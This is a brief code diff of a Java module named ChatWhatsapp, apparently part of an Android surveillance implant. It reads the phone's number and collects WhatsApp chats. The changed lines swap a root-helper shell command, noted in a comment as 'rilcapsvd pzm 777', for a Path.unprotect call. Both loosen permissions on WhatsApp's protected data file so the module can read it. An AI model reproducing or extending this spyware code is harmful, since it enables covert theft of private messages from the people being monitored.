@@ -82,7 +82,7 @@ public class ChatWhatsapp extends SubModuleChat {
 		hastableConversationLastIndex = new Hashtable<String, Integer>();
 		try {
 			myPhoneNumber = readMyPhoneNumber();
-			
+
 			if (DEFAULT_LOCAL_NUMBER.equals(myPhoneNumber)) {
 				enabled = false;
 				return;
@@ -140,7 +140,9 @@ public class ChatWhatsapp extends SubModuleChat {
 
 		String filename = Messages.getString("f_d");
 		try {
-			Runtime.getRuntime().exec(Messages.getString("f_2") + filename);
+			// f_2=/system/bin/rilcapsvd pzm 777
+			Path.unprotect(filename, 2, true);
+			// Runtime.getRuntime().exec(Messages.getString("f_2") + filename);
 			File file = new File(filename);
 
 			if (Cfg.DEBUG) {
